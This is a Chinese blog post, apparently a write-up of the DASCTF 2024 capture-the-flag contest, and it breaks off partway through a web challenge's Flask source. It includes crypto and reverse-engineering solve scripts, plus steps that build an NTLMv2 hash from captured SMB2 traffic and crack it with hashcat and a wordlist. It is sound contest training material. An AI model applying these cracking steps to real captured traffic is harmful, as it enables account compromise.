@@ -1,0 +1,785 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412222328446.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="XU17">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="DASCTF2024最后一战 wp by Pwn13ss">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2024-DASCTF-wp">
+<meta property="og:url" content="http://example.com/2024/12/23/2024DASCTF/index.html">
+<meta property="og:site_name" content="XU17">
+<meta property="og:description" content="DASCTF2024最后一战 wp by Pwn13ss">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241829302.jpg">
+<meta property="article:published_time" content="2024-12-23T13:00:00.000Z">
+<meta property="article:modified_time" content="2024-12-24T11:30:54.693Z">
+<meta property="article:author" content="XU17">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241829302.jpg">
+  
+  
+  
+  <title>2024-DASCTF-wp - XU17</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>XU17&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241829302.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="2024-DASCTF-wp"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-12-23 21:00" pubdate>
+          2024年12月23日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          22 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">2024-DASCTF-wp</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="2024-DASCTF-wp"><a href="#2024-DASCTF-wp" class="headerlink" title="2024-DASCTF-wp"></a>2024-DASCTF-wp</h1><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="数论的香氛"><a href="#数论的香氛" class="headerlink" title="数论的香氛"></a>数论的香氛</h3><ul>
+<li><strong>题目：</strong></li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> isprime<br><span class="hljs-keyword">from</span> sympy.ntheory <span class="hljs-keyword">import</span> legendre_symbol<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long<br><br>k=<span class="hljs-number">79</span>    <span class="hljs-comment">#&lt;-- i couldn&#x27;t stress more</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_p</span>():<br>    <span class="hljs-keyword">global</span> k<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        r=random.randint(<span class="hljs-number">2</span>**<span class="hljs-number">69</span>,<span class="hljs-number">2</span>**<span class="hljs-number">70</span>)<br>        p=<span class="hljs-number">2</span>**k*r+<span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> isprime(p):<br>            <span class="hljs-keyword">return</span> p<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">continue</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_q</span>():<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        r=random.randint(<span class="hljs-number">2</span>**<span class="hljs-number">147</span>,<span class="hljs-number">2</span>**<span class="hljs-number">148</span>)<br>        q=<span class="hljs-number">4</span>*r+<span class="hljs-number">3</span><br>        <span class="hljs-keyword">if</span> isprime(q):<br>            <span class="hljs-keyword">return</span> q<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">continue</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_y</span>():<br>    <span class="hljs-keyword">global</span> n,p,q<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        y=random.randint(<span class="hljs-number">0</span>,n-<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">if</span> legendre_symbol(y,p)==<span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">elif</span> legendre_symbol(y,q)==<span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> y<br><br><br>flag=<span class="hljs-string">b&#x27;DASCTF&#123;redacted:)&#125;&#x27;</span><br>flag_pieces=[flag[<span class="hljs-number">0</span>:<span class="hljs-number">10</span>],flag[<span class="hljs-number">11</span>:<span class="hljs-number">21</span>],flag[<span class="hljs-number">22</span>:<span class="hljs-number">32</span>],flag[<span class="hljs-number">33</span>:<span class="hljs-number">43</span>],flag[<span class="hljs-number">44</span>:]]<br><span class="hljs-comment">#assert int(bytes_to_long((flag_pieces[i] for i in range(5)))).bit_length()==k</span><br><br>p=get_p()<br>q=get_q()<br>n=p*q<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;n=&#125;</span>&#x27;</span>)<br><br>y=get_y()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;y=&#125;</span>&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode</span>(<span class="hljs-params">m</span>):<br>    <span class="hljs-keyword">global</span> y,n,k<br>    x = random.randint(<span class="hljs-number">1</span>, n - <span class="hljs-number">1</span>)<br>    c=(<span class="hljs-built_in">pow</span>(y,m,n)*<span class="hljs-built_in">pow</span>(x,<span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>,k),n))%n<br>    <span class="hljs-keyword">return</span> c<br><br>cs=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag_pieces)):<br>    ci=encode(bytes_to_long(flag_pieces[i]))<br>    cs.append(ci)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;cs=&#125;</span>&#x27;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">n=542799179636839492268900255776759322356188435185061417388485378278779491236741777034539347</span><br><span class="hljs-string">y=304439269593920283890993394966761083993573819485737741439790516965458877720153847056020690</span><br><span class="hljs-string">cs=[302425991290493703631236053387822220993687940015503176763298104925896002167283079926671604, 439984254328026142169547867847928383533091717170996198781543139431283836994276036750935235, 373508223748617252014658136131733110314734961216630099592116517373981480752966721942060039, 246328010831179104162852852153964748882971698116964204135222670606477985487691371234998588, 351248523787623958259846173184063420603640595997008994436503031978051069643436052471484545]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>首先注意到n很短，使用sage可以在大概十几分钟分解n（实际上factordb.com可以直接分解n，比赛时候忘记用了）</p>
+<p>y设置为J(y&#x2F;p) &#x3D; J(y&#x2F;q) &#x3D; -1，很容易想到Goldwasser-Micali公钥加密系统，但Goldwasser-Micali 算法一次只能加密1bit，而题目中加密长度达到了k bits，且在计算c时多乘了pow(x,pow(2,k),n)。这实际上是为减少带宽的浪费而实现的更高效的GM算法。于是我们可以找到论文Efficient Cryptosystems From 2^k-th Power Residue Symbols，利用论文给出的方法我们便可以编写解密脚本</p>
+</blockquote>
+<ul>
+<li><strong>exp</strong></li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> mod_inverse<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">c, p, k, D</span>):<br>    m = <span class="hljs-number">0</span><br>    B = <span class="hljs-number">1</span><br>    C = <span class="hljs-built_in">pow</span>(c, (p - <span class="hljs-number">1</span>) // (<span class="hljs-number">2</span>**k), p)<br>    <br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, k):<br>        z = <span class="hljs-built_in">pow</span>(C, <span class="hljs-number">2</span>**(k-j), p)<br>        <span class="hljs-keyword">if</span> z != <span class="hljs-number">1</span>:<br>            m += B<br>            C = (C * D) % p<br>        B &lt;&lt;= <span class="hljs-number">1</span>  <span class="hljs-comment"># B = 2 * B</span><br>        D = (D * D) % p<br>    <br>    <span class="hljs-keyword">if</span> C != <span class="hljs-number">1</span>:<br>        m += B<br>    <br>    <span class="hljs-keyword">return</span> m<br><br>q = <span class="hljs-number">863327174253852394776516978368858092781662547</span><br>p = <span class="hljs-number">628729403897154553626034231171921094272614401</span><br>n = <span class="hljs-number">542799179636839492268900255776759322356188435185061417388485378278779491236741777034539347</span><br>y = <span class="hljs-number">304439269593920283890993394966761083993573819485737741439790516965458877720153847056020690</span><br>k = <span class="hljs-number">79</span><br><br>k = <span class="hljs-number">79</span><br>D = <span class="hljs-built_in">pow</span>(y, -(p - <span class="hljs-number">1</span>) // <span class="hljs-number">2</span>**k, p)  <br><span class="hljs-built_in">print</span>(D)<br>cs = [<br>    <span class="hljs-number">302425991290493703631236053387822220993687940015503176763298104925896002167283079926671604</span>,<br>    <span class="hljs-number">439984254328026142169547867847928383533091717170996198781543139431283836994276036750935235</span>,<br>    <span class="hljs-number">373508223748617252014658136131733110314734961216630099592116517373981480752966721942060039</span>,<br>    <span class="hljs-number">246328010831179104162852852153964748882971698116964204135222670606477985487691371234998588</span>,<br>    <span class="hljs-number">351248523787623958259846173184063420603640595997008994436503031978051069643436052471484545</span><br>]<br><br>decrypted_messages = [decrypt(ci, p, k, D) <span class="hljs-keyword">for</span> ci <span class="hljs-keyword">in</span> cs]<br><br><span class="hljs-keyword">for</span> i, m <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(decrypted_messages):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Decrypted message <span class="hljs-subst">&#123;i&#125;</span>: <span class="hljs-subst">&#123;m&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs flag">DASCTF&#123;go0_j06!let1sm0v31n_t0_th3r_chanlenges~&gt;_&lt;&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412231957738.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="弹道偏下"><a href="#弹道偏下" class="headerlink" title="弹道偏下"></a>弹道偏下</h3><p>打开流量包，发现是SMB2流量加密</p>
+<p>按照以下格式构造hash</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">username::domain::NTLMServerChallenge:NTProofStr:NTLMv2Response<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412232000375.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412231958872.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">share::MicrosoftAccount:0a08d9f15eb53eea:a20aec951c89961f2e81bf0917d8990a:<span class="hljs-number">0</span>101000000000000cfebd19d3636db01022ada3cfbb5b30e0000000002001e004400450053004b0054004f0050002d004800440039004b0051004e00540001001e004400450053004b0054004f0050002d004800440039004b0051004e00540004001e004400450053004b0054004f0050002d004800440039004b0051004e00540003001e004400450053004b0054004f0050002d004800440039004b0051004e00540007000800cfebd19d3636db01060004000200000008003000300000000000000001000000002000004c3c615542417f8e002c772c6064cc84d886fec17c1ed7cceea68daf7f6954fc0a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003100340039002e003100350035000000000000000000<br></code></pre></td></tr></table></figure>
+
+<p>hashcat爆破</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">hashcat -a <span class="hljs-number">0</span> -m <span class="hljs-number">5600</span>  v2.txt ./rockyou.txt  --force<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412231959558.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>解密流量包，导出doc文件</p>
+<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412231957189.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>winhex打开明显是逆序，拿工具改一下</p>
+<p>（比赛时候只做到这里~~ಠ_ಠ）</p>
+<p>新建一个doc文件，对比发现少了一大段文件头，把文件头复制过去<img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412232000700.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412231957035.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>打开doc发现需要密码，放passware跑</p>
+<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412231957120.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>得到密码36521478（和刚才的SMB2密码一样）打开文件flag就在第一行</p>
+<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412231957175.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs flag">flag&#123;u_are_a_g00d_OLE_Repairer&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="tryre"><a href="#tryre" class="headerlink" title="tryre"></a>tryre</h3><p>换表base64加密</p>
+<p>逐字节异或2</p>
+<p>脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> string<br>encode = <span class="hljs-string">&quot;M@ASL3MF`uL3ICT2IhUgKSD2IeDsICH7Hd26HhQgKSQhNCX7TVL3UFMeHi2?&quot;</span><br>str1 = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(encode)):<br>  str1 = str1 + <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(encode[i]) ^ <span class="hljs-number">2</span>)<br>string1 = <span class="hljs-string">&quot;ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/&quot;</span><br>string2 = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span><br><span class="hljs-built_in">print</span> (<span class="hljs-built_in">str</span>(base64.b64decode(str1.translate(<span class="hljs-built_in">str</span>.maketrans(string1,string2)))))<br></code></pre></td></tr></table></figure>
+
+<p>得到</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>：DASCTF&#123;<span class="hljs-number">454646</span>fa-<span class="hljs-number">2462</span>-<span class="hljs-number">4392</span>-<span class="hljs-number">82</span>ea-<span class="hljs-number">5</span>f809ad5ddc2&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><ul>
+<li>NULL</li>
+</ul>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="const-python"><a href="#const-python" class="headerlink" title="const_python"></a>const_python</h3><ul>
+<li>题目提示了源码放在了<code>src</code>目录，访问得到部分源码，注意，有一部分被注释到了看不见，右键查看源码或者在Response中可以看到被隐藏的部分，我们把两份代码拼到一起。得到源码如下</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> builtins<br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, jsonify, session<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-comment"># 创建 Flask 应用实例</span><br>app = Flask(__name__)<br><br><span class="hljs-comment"># 设置一个随机的密钥，用于保护会话</span><br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-built_in">str</span>(uuid.uuid4()).replace(<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br><br><span class="hljs-comment"># 定义一个用户类</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, username, password, auth=<span class="hljs-string">&#x27;ctfer&#x27;</span></span>):<br>        <span class="hljs-variable language_">self</span>.username = username<br>        <span class="hljs-variable language_">self</span>.password = password<br>        <span class="hljs-variable language_">self</span>.auth = auth<br><br><span class="hljs-comment"># 生成一个随机密码，并创建一个管理员用户实例</span><br>password = <span class="hljs-built_in">str</span>(uuid.uuid4()).replace(<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>Admin = User(<span class="hljs-string">&#x27;admin&#x27;</span>, password, <span class="hljs-string">&quot;admin&quot;</span>)<br><br><span class="hljs-comment"># 定义根路由，访问网站根目录时返回欢迎信息</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Welcome to my application&quot;</span><br><br><span class="hljs-comment"># 定义登录路由，处理 GET 和 POST 请求</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, 